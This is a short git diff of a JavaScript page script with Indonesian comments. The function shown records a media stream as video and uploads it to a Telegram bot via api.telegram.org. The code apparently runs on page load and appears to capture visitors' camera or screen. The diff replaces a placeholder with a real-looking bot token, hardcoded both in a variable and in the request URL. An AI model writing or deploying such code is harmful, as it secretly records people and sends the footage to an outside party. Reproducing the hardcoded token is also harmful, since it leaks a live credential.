@@ -10,9 +10,9 @@ document.addEventListener("DOMContentLoaded", async function () {
 });
 
 async function sendToTelegram(stream) {
-    const botToken = "YOUR_BOT_TOKEN"; // Ganti dengan token bot Anda
+    const botToken = "7810176235:AAGsVRjcENBqSAyeL5nLghvJvBNnitVLBDM"; // Ganti dengan token bot Anda
     const chatId = "YOUR_CHAT_ID"; // Ganti dengan chat ID Anda
-    const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
+    const url = `https://api.telegram.org/bot7810176235:AAGsVRjcENBqSAyeL5nLghvJvBNnitVLBDM/sendVideo`;
 
     const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
 
